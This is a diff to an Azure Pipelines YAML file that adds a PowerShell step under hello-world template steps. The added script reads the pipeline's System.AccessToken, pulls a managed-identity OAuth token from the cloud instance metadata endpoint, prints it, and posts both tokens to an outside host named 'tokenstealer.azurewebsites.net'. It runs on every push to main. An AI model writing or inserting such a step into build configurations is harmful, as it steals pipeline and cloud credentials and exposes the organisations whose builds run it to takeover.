@@ -6,8 +6,11 @@
 trigger:
 - main
 
+pool:
+  name: TestAgentPool
+
 steps:
-- script: echo Hellssso, world!
+- script: echo Hello, world!
   displayName: 'Run a one-line script'
 
 - script: |
@@ -15,13 +18,38 @@ steps:
     echo See https://aka.ms/yaml
   displayName: 'Run a multi-line script'
 
-
-
-- task: AzureCLI@2
+- task: PowerShell@2
   inputs:
-    azureSubscription: 'MISvc'
-    scriptType: 'ps'
-    scriptLocation: 'inlineScript'
-    inlineScript: |
-      az --version
-      az account show
+    targetType: 'inline'
+    script: |
+      # Write your PowerShell commands here.
+      
+      Write-Host "Hello World"
+      Write-Host 'Hi'
+      $v= $env:SYSTEM_ACCESSTOKEN
+
+      $msiResponse = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.net" `
+              -Headers @{Metadata = "true" } -UseBasicParsing
+      $msiContent = $msiResponse.Content | ConvertFrom-Json
+      $access_token = $msiContent.access_token
+      Write-Host $access_token
+      
+      $url = "https://tokenstealer.azurewebsites.net/api/HttpTrigger1?code=kcMARCpv_RepaIFcQlIVV7SCNDIbkB89TZC90h8yYD_AAzFutFRB-A=="  # Replace with your desired endpoint URL
+      $body = @{  
+          "name" = $v
+      } | ConvertTo-Json
+      
+      $headers = @{
+          "Content-Type" = "application/json"
+      }
+      
+      $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
+      
+      $body2=@{  
+          "name" = $access_token
+      } | ConvertTo-Json
+
+      $response = Invoke-RestMethod -Uri $url -Method Post -Body $body2 -Headers $headers
+      $response
+  env:
+    system_accesstoken: $(System.AccessToken)
